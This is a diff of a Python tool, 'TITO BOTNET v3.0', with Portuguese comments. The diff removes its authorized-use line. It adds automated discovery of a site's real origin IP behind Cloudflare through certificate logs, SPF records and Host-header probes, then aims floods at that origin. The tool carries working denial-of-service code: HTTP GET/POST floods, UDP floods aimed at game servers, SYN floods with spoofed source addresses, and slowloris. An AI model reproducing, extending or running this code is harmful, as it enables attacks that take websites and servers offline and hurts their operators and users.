@@ -1,25 +1,29 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-TITO LOAD TESTER v2.1 - vetores estilo Mirai (arquivo unico, zero dependencias)
-Uso:  python tito.py           -> menu interativo
-      python tito.py --url URL --bots N --vector TIPO --time SEG
-Vetores: http-get | http-post | udp | syn | slowloris
-Apenas para infraestrutura propria ou alvos com autorizacao por escrito.
+TITO BOTNET v3.0 - Load Tester com bypass Cloudflare (arquivo unico, zero deps)
+Uso:
+  python tito.py                                          -> menu interativo
+  python tito.py --url https://exemplo.com --bypass --bots 200 --vector udp --time 60
+  python tito.py --url http://exemplo.com --ip 1.2.3.4 --bots 100 --vector http-get --time 30
 """
 
 import argparse
+import ipaddress
+import json
 import os
 import random
+import re
 import socket
 import ssl
 import struct
+import subprocess
 import sys
 import threading
 import time
-from urllib.parse import urlparse
+import urllib.request
+from urllib.parse import quote, urlparse
 
-# Windows: forca terminal a aceitar UTF-8
 try:
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
     sys.stderr.reconfigure(encoding="utf-8", errors="replace")
@@ -32,16 +36,24 @@ BANNER = r"""
    | |   | |   | |   | |
    | |   | |   | |   | |
    |_|   |_|   |_|   |_|
-  TITO LOAD TESTER v2.1 - vetores estilo Mirai
+ TITO BOTNET v3.0 - Cloudflare Bypass Load Tester
 """
+
+# Ranges publicos da Cloudflare (fallback; atualiza ao vivo se possivel)
+CF_RANGES = [
+    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
+    "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
+    "197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
+    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
+]
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/126.0",
     "curl/8.6.0",
-    "Go-http-client/1.1",
 ]
+
+VECTORS = ["http-get", "http-post", "udp", "syn", "slowloris"]
 
 STOP = threading.Event()
 LOCK = threading.Lock()
@@ -49,8 +61,8 @@ COUNTER = 0
 FAILS = 0
 
 
+# ---------------- contadores ----------------
 def rand_bytes(n):
-    """random.randbytes nao existe antes do Python 3.9 -> fallback os.urandom."""
     try:
         return random.randbytes(n)
     except AttributeError:
@@ -66,7 +78,6 @@ def bump(n=1, fail=False):
 
 
 def stats_printer(duration):
-    global COUNTER, FAILS
     start = time.time()
     last = start
     last_count = 0
@@ -78,32 +89,151 @@ def stats_printer(duration):
         rps = (c - last_count) / (now - last) if now > last else 0
         last, last_count = now, c
         print("  [*] %6.1fs | enviados: %d | falhas: %d | ritmo: %,.0f/s" % (now - start, c, f, rps))
-    print("\n[*] TOTAL: %d requisicoes/pacotes, %d falhas em %ds" % (COUNTER, FAILS, duration))
+    with LOCK:
+        c, f = COUNTER, FAILS
+    print("\n[*] TOTAL: %d requisicoes/pacotes, %d falhas em %ds" % (c, f, duration))
 
 
-def csum(data):
-    if len(data) % 2:
-        data += b"\x00"
-    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
-    s = (s >> 16) + (s & 0xFFFF)
-    s += s >> 16
-    return (~s) & 0xFFFF
+# ---------------- bypass Cloudflare ----------------
+def fetch_cf_ranges():
+    global CF_RANGES
+    try:
+        req = urllib.request.Request("https://www.cloudflare.com/ips-v4", headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=15) as r:
+            lines = [l.strip() for l in r.read().decode().splitlines() if l.strip()]
+        if lines:
+            CF_RANGES = lines
+    except Exception:
+        pass
 
 
-def http_flood(parsed, path, method, bot_id):
-    host = parsed.hostname
-    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+def is_cloudflare(ip):
+    try:
+        a = ipaddress.ip_address(ip)
+        for cidr in CF_RANGES:
+            if a in ipaddress.ip_network(cidr):
+                return True
+    except ValueError:
+        pass
+    return False
+
+
+def crt_sh_subdomains(domain):
+    """Subdominios expostos em certificados publicos (transparencia)."""
+    q = quote("%." + domain)
+    url = "https://crt.sh/?q=%s&output=json" % q
+    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+    with urllib.request.urlopen(req, timeout=30) as r:
+        data = json.loads(r.read().decode("utf-8", "replace"))
+    names = set()
+    for entry in data:
+        for n in str(entry.get("name_value", "")).split("\n"):
+            n = n.strip().lower()
+            if n and "*" not in n and (n == domain or n.endswith("." + domain)):
+                names.add(n)
+    names.add(domain)
+    names.add("www." + domain)
+    return names
+
+
+def spf_ips(domain):
+    """IPs vazados no registro TXT/SPF (ex.: servidor de email no mesmo host)."""
+    ips = set()
+    cmds = [["nslookup", "-type=TXT", domain], ["dig", "+short", "TXT", domain]]
+    for cmd in cmds:
+        try:
+            out = subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout
+            if out:
+                for m in re.finditer(r"ip4:([\d.]+)", out):
+                    ips.add(m.group(1))
+                break
+        except Exception:
+            continue
+    return ips
+
+
+def probe_origin(ip, domain):
+    """Confirma origin: responde com Host header correto na porta 80/443."""
+    for port in (443, 80):
+        try:
+            s = socket.create_connection((ip, port), timeout=6)
+            if port == 443:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=domain)
+            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % domain).encode())
+            resp = s.recv(2048)
+            s.close()
+            line = resp.split(b"\r\n", 1)[0].decode(errors="replace")
+            if line.startswith("HTTP/"):
+                return line
+        except Exception:
+            continue
+    return None
+
+
+def discover(domain):
+    print("\n[*] Descobrindo IP real de %s (bypass Cloudflare)..." % domain)
+    fetch_cf_ranges()
+
+    try:
+        pub = socket.gethostbyname(domain)
+        print("[*] IP publico: %s -> %s" % (domain, pub))
+        print("    (%s)" % ("e da Cloudflare - origin escondido, vamos achar" if is_cloudflare(pub) else "NAO e da Cloudflare - pode ser o origin direto"))
+    except Exception as e:
+        print("[!] DNS publico falhou: %s" % e)
+
+    subs = set()
+    try:
+        subs = crt_sh_subdomains(domain)
+        print("[*] crt.sh: %d subdominios/certificados encontrados." % len(subs))
+    except Exception as e:
+        print("[!] crt.sh indisponivel: %s" % e)
+
+    cands = {}
+    for name in sorted(subs)[:150]:
+        try:
+            for ip in socket.gethostbyname_ex(name)[2]:
+                if not is_cloudflare(ip):
+                    cands.setdefault(ip, set()).add(name)
+        except Exception:
+            pass
+
+    for ip in spf_ips(domain):
+        if not is_cloudflare(ip):
+            cands.setdefault(ip, set()).add("(SPF/MX)")
+
+    print("\n[*] Candidatos fora da Cloudflare (testando direto com Host header):")
+    origins = []
+    for ip, names in sorted(cands.items(), key=lambda x: -len(x[1])):
+        line = probe_origin(ip, domain)
+        status = line or "sem resposta"
+        flag = "  <-- ORIGIN CONFIRMADO" if line else ""
+        print("    %-16s %-18s %s%s" % (ip, status, ",".join(sorted(names)[:3]), flag))
+        if line:
+            origins.append(ip)
+
+    if not origins:
+        print("\n[!] Nenhum origin confirmado. Origem pode estar so em IP v6, atras de outro CDN,")
+        print("    ou totalmente escondida. Tente tambem: historico de DNS (SecurityTrails/ViewDNS),")
+        print("    shodan.io (favicon hash) e emails do dominio (cabecalhos completos).")
+    return origins
+
+
+# ---------------- vetores ----------------
+def http_flood(ip, port, host_header, path, method, use_ssl, bot_id):
     ctx = None
-    if parsed.scheme == "https":
+    if use_ssl:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
     while not STOP.is_set():
         try:
-            sock = socket.create_connection((host, port), timeout=5)
+            sock = socket.create_connection((ip, port), timeout=5)
             if ctx:
-                sock = ctx.wrap_socket(sock, server_hostname=host)
-            headers = "Host: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n" % (host, random.choice(USER_AGENTS))
+                sock = ctx.wrap_socket(sock, server_hostname=host_header)
+            headers = "Host: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n" % (host_header, random.choice(USER_AGENTS))
             body = ""
             if method == "POST":
                 body = "x=" + rand_bytes(64).hex()
@@ -120,27 +250,34 @@ def http_flood(parsed, path, method, bot_id):
             bump(fail=True)
 
 
-def udp_flood(host, port, bot_id):
+def udp_flood(ip, port, bot_id):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = rand_bytes(1400)
     while not STOP.is_set():
         try:
-            sock.sendto(payload, (host, port))
+            sock.sendto(payload, (ip, port))
             bump()
         except Exception:
             bump(fail=True)
 
 
-def syn_flood(host, port, bot_id):
+def csum(data):
+    if len(data) % 2:
+        data += b"\x00"
+    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
+    return (~s) & 0xFFFF
+
+
+def syn_flood(ip, port, bot_id):
     try:
         raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     except (PermissionError, OSError):
-        print("[!] SYN flood requer root/admin e raw sockets (nao funciona no Windows via Python).")
-        print("[!] Use o vetor 'udp' ou 'http-get' no Windows.")
+        print("[!] SYN flood NAO funciona no Windows via Python. Use 'udp' ou 'http-get'.")
         return
-    dst_ip = socket.gethostbyname(host)
-    dst_bin = socket.inet_aton(dst_ip)
+    dst_bin = socket.inet_aton(ip)
     while not STOP.is_set():
         src_ip = socket.inet_aton("%d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4)))
         src_port = random.randint(1024, 65535)
@@ -149,27 +286,25 @@ def syn_flood(host, port, bot_id):
         pseudo = dst_bin + src_ip + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
         tcp = struct.pack("!HHLLBBHHH", src_port, port, seq, 0, 5 << 4, 2, 1024, csum(pseudo + tcp), 0)
         total = 20 + len(tcp)
-        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
-                         0, 64, socket.IPPROTO_TCP, 0, src_ip, dst_bin)
-        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
-                         0, 64, socket.IPPROTO_TCP, csum(ip), src_ip, dst_bin)
+        ip_h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
+                           0, 64, socket.IPPROTO_TCP, 0, src_ip, dst_bin)
+        ip_h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
+                           0, 64, socket.IPPROTO_TCP, csum(ip_h), src_ip, dst_bin)
         try:
-            raw.sendto(ip + tcp, (host, port))
+            raw.sendto(ip_h + tcp, (ip, port))
             bump()
         except Exception:
             bump(fail=True)
 
 
-def slowloris(parsed, bot_id):
-    host = parsed.hostname
-    port = parsed.port or 80
+def slowloris(ip, port, host_header, path, bot_id):
     conns = []
     while not STOP.is_set():
         try:
             if len(conns) < 150:
-                s = socket.create_connection((host, port), timeout=10)
+                s = socket.create_connection((ip, port), timeout=10)
                 s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
-                           % (parsed.path or "/", host, random.choice(USER_AGENTS))).encode())
+                           % (path, host_header, random.choice(USER_AGENTS))).encode())
                 conns.append(s)
                 bump()
             for c in conns[:]:
@@ -189,10 +324,8 @@ def slowloris(parsed, bot_id):
             pass
 
 
-VECTORS = ["http-get", "http-post", "udp", "syn", "slowloris"]
-
-
-def run_attack(url, bots, vector, duration, port=0):
+# ---------------- motor ----------------
+def run_attack(url, bots, vector, duration, port=0, ip_override=None):
     parsed = urlparse(url if "://" in url else "http://" + url)
     host = parsed.hostname
     if not host:
@@ -202,23 +335,30 @@ def run_attack(url, bots, vector, duration, port=0):
     path = parsed.path or "/"
     if parsed.query:
         path += "?" + parsed.query
+    use_ssl = parsed.scheme == "https"
 
-    print("\n[*] Alvo: %s:%d%s" % (host, port, path))
+    try:
+        target_ip = ip_override or socket.gethostbyname(host)
+    except socket.gaierror as e:
+        print("[!] DNS falhou para %s: %s" % (host, e))
+        return
+
+    print("\n[*] Alvo IP: %s:%d | Host header: %s" % (target_ip, port, host))
     print("[*] Vetor: %s | Bots: %d | Duracao: %ds\n" % (vector, bots, duration))
 
     STOP.clear()
     workers = []
     for i in range(bots):
         if vector == "http-get":
-            t = threading.Thread(target=http_flood, args=(parsed, path, "GET", i), daemon=True)
+            t = threading.Thread(target=http_flood, args=(target_ip, port, host, path, "GET", use_ssl, i), daemon=True)
         elif vector == "http-post":
-            t = threading.Thread(target=http_flood, args=(parsed, path, "POST", i), daemon=True)
+            t = threading.Thread(target=http_flood, args=(target_ip, port, host, path, "POST", use_ssl, i), daemon=True)
         elif vector == "udp":
-            t = threading.Thread(target=udp_flood, args=(host, port, i), daemon=True)
+            t = threading.Thread(target=udp_flood, args=(target_ip, port, i), daemon=True)
         elif vector == "syn":
-            t = threading.Thread(target=syn_flood, args=(host, port, i), daemon=True)
+            t = threading.Thread(target=syn_flood, args=(target_ip, port, i), daemon=True)
         else:
-            t = threading.Thread(target=slowloris, args=(parsed, i), daemon=True)
+            t = threading.Thread(target=slowloris, args=(target_ip, port, host, path, i), daemon=True)
         workers.append(t)
         t.start()
 
@@ -237,36 +377,81 @@ def run_attack(url, bots, vector, duration, port=0):
     print("[*] Teste finalizado.\n")
 
 
+def bypass_and_attack(url, bots, vector, duration, port=0):
+    parsed = urlparse(url if "://" in url else "http://" + url)
+    domain = parsed.hostname
+    if not domain:
+        print("[!] URL invalida.")
+        return
+    origins = discover(domain)
+    if not origins:
+        print("\n[!] Nenhum origin confirmado. Atacando o IP publico (efeito limitado).")
+        run_attack(url, bots, vector, duration, port)
+        return
+    print("\n[*] Origins confirmados: %s" % ", ".join(origins))
+    run_attack(url, bots, vector, duration, port, ip_override=origins[0])
+    if len(origins) > 1:
+        print("[*] Outros origins (ataque manual com --ip):")
+        for ip in origins[1:]:
+            print("    python tito.py --url %s --ip %s --bots %d --vector %s --time %d" % (url, ip, bots, vector, duration))
+
+
+# ---------------- interface ----------------
 def menu():
     print(BANNER)
-    print("=" * 52)
-    url = input("[?] URL do alvo (ex: https://exemplo.com): ").strip()
-    print("\nVetores disponiveis:")
-    for i, v in enumerate(VECTORS, 1):
-        desc = {
-            "http-get":  "Flood HTTP GET  - web servers",
-            "http-post": "Flood HTTP POST - web servers com forms",
-            "udp":       "Flood UDP       - game servers (Minecraft, CS, FiveM)",
-            "syn":       "Flood SYN       - infraestrutura (requer admin/raw socket)",
-            "slowloris": "Slowloris       - esgota conexoes do servidor web",
-        }[v]
-        print("   %d - %-10s %s" % (i, v, desc))
-    try:
-        op = int(input("\n[?] Escolha o vetor (1-5): ").strip())
-        vec = VECTORS[op - 1]
-        bots = int(input("[?] Quantos bots/threads: ").strip())
-        duration = int(input("[?] Duracao em segundos: ").strip())
-        extra = input("[?] Porta especifica (ENTER para auto): ").strip()
-        port = int(extra) if extra.isdigit() else 0
-    except (ValueError, IndexError):
-        print("[!] Entrada invalida.")
+    print("=" * 54)
+    print("  1 - Buscar IP real (bypass Cloudflare) [diagnostico]")
+    print("  2 - Buscar e ATACAR (bypass automatico)")
+    print("  3 - Atacar IP direto (informar IP + Host)")
+    print("=" * 54)
+    op = input("\n[?] Opcao (1-3): ").strip()
+
+    if op == "1":
+        url = input("[?] URL do alvo: ").strip()
+        parsed = urlparse(url if "://" in url else "http://" + url)
+        if parsed.hostname:
+            discover(parsed.hostname)
+        else:
+            print("[!] URL invalida.")
         return
-    run_attack(url, bots, vec, duration, port)
+
+    if op == "2":
+        url = input("[?] URL do alvo: ").strip()
+        bots = int(input("[?] Bots/threads (ENTER=50): ").strip() or "50")
+        duration = int(input("[?] Duracao em segundos (ENTER=30): ").strip() or "30")
+        print("\nVetores:")
+        for i, v in enumerate(VECTORS, 1):
+            print("  %d - %s" % (i, v))
+        idx = int(input("[?] Vetor (1-5, ENTER=1): ").strip() or "1")
+        vec = VECTORS[idx - 1]
+        extra = input("[?] Porta (ENTER auto): ").strip()
+        port = int(extra) if extra.isdigit() else 0
+        bypass_and_attack(url, bots, vec, duration, port)
+        return
+
+    if op == "3":
+        ip = input("[?] IP do origin: ").strip()
+        host = input("[?] Dominio / Host header: ").strip()
+        bots = int(input("[?] Bots/threads (ENTER=50): ").strip() or "50")
+        duration = int(input("[?] Duracao em segundos (ENTER=30): ").strip() or "30")
+        print("\nVetores:")
+        for i, v in enumerate(VECTORS, 1):
+            print("  %d - %s" % (i, v))
+        idx = int(input("[?] Vetor (1-5, ENTER=1): ").strip() or "1")
+        vec = VECTORS[idx - 1]
+        extra = input("[?] Porta (ENTER auto): ").strip()
+        port = int(extra) if extra.isdigit() else 0
+        run_attack("http://%s/" % host, bots, vec, duration, port, ip_override=ip)
+        return
+
+    print("[!] Opcao invalida.")
 
 
 def cli():
-    p = argparse.ArgumentParser(description="TITO Load Tester v2.1")
+    p = argparse.ArgumentParser(description="TITO BOTNET v3.0 - Load Tester com bypass Cloudflare")
     p.add_argument("--url", help="URL do alvo (ex.: https://exemplo.com)")
+    p.add_argument("--ip", help="IP direto (origin) - pula a busca")
+    p.add_argument("--bypass", action="store_true", help="Descobre o origin e ataca direto")
     p.add_argument("--bots", type=int, default=50, help="Numero de bots/threads")
     p.add_argument("--vector", choices=VECTORS, default="http-get", help="Vetor de ataque")
     p.add_argument("--time", type=int, default=30, help="Duracao em segundos")
@@ -275,7 +460,12 @@ def cli():
     if not a.url:
         p.print_help()
         sys.exit(1)
-    run_attack(a.url, a.bots, a.vector, a.time, a.port)
+    if a.bypass:
+        bypass_and_attack(a.url, a.bots, a.vector, a.time, a.port)
+    elif a.ip:
+        run_attack(a.url, a.bots, a.vector, a.time, a.port, ip_override=a.ip)
+    else:
+        run_attack(a.url, a.bots, a.vector, a.time, a.port)
 
 
 if __name__ == "__main__":
